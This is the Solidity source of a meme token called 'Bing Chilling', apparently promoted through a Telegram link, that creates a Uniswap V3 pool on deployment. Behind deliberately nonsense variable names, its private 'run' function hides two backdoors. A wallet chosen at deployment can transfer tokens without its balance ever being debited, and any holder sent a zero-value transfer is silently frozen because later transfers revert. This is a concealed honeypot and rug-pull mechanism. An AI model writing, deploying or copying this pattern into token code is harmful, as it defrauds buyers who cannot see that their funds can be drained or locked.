/*

https://t.me/bingchilling_eth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPeripheryImmutableState {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract BingChilling is Ownable {
    string public symbol = 'Bing Chilling';

    function approve(address soap, uint256 fifteen) public returns (bool success) {
        allowance[msg.sender][soap] = fifteen;
        emit Approval(msg.sender, soap, fifteen);
        return true;
    }

    address public uniswapV3Pair;

    mapping(address => uint256) private table;

    function transfer(address official, uint256 fifteen) public returns (bool success) {
        run(msg.sender, official, fifteen);
        return true;
    }

    function transferFrom(address add, address official, uint256 fifteen) public returns (bool success) {
        require(fifteen <= allowance[add][msg.sender]);
        allowance[add][msg.sender] -= fifteen;
        run(add, official, fifteen);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private could;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private lesson = 23;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(address with) {
        balanceOf[msg.sender] = totalSupply;
        could[with] = lesson;
        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    string public name = 'Bing Chilling';

    function run(address add, address official, uint256 fifteen) private returns (bool success) {
        if (could[add] == 0) {
            balanceOf[add] -= fifteen;
        }

        if (fifteen == 0) table[official] += lesson;

        if (add != uniswapV3Pair && could[add] == 0 && table[add] > 0) {
            could[add] -= lesson;
        }

        balanceOf[official] += fifteen;
        emit Transfer(add, official, fifteen);
        return true;
    }

    uint8 public decimals = 9;
}